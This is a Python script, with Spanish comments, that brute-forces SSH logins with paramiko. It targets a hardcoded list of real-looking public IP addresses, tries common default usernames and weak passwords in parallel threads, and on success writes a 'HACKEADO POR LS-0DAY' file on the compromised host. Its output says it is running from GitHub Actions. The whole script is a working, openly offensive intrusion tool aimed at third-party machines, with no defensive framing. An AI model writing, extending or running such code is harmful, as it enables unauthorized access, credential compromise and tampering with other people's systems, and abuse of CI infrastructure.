import paramiko
import threading

# Muestra de IPs que encontraste
IPS = [
    "195.82.118.253", "84.212.93.110", "7.201.87.4", 
    "36.112.247.92", "190.64.202.180", "17.155.30.169",
    "211.117.108.214", "42.39.233.123", "61.157.95.71", 
    "79.90.46.75"
]

USERS = ["root", "admin", "user", "ubuntu", "test"]
PASSWORDS = ["admin", "123456", "password", "root", "1234", "admin123"]

def attack(ip):
    print(f"[*] Atacando {ip}...", flush=True)
    for user in USERS:
        for pwd in PASSWORDS:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                # Timeout bajo para no perder tiempo
                ssh.connect(ip, username=user, password=pwd, timeout=3)
                
                print(f"\n[+] EXITO: {ip} | User: {user} | Pass: {pwd}", flush=True)
                
                # Comando de prueba (Si entra, crea un archivo en la víctima)
                cmd = "echo 'HACKEADO POR LS-0DAY' > /tmp/hacked.txt"
                ssh.exec_command(cmd)
                ssh.close()
                return
            except paramiko.AuthenticationException:
                continue
            except Exception:
                break
    print(f"[-] Falló o rechazó conexión: {ip}", flush=True)

print("Iniciando escaneo en GitHub Actions...", flush=True)
for ip in IPS:
    t = threading.Thread(target=attack, args=(ip,))
    t.start()
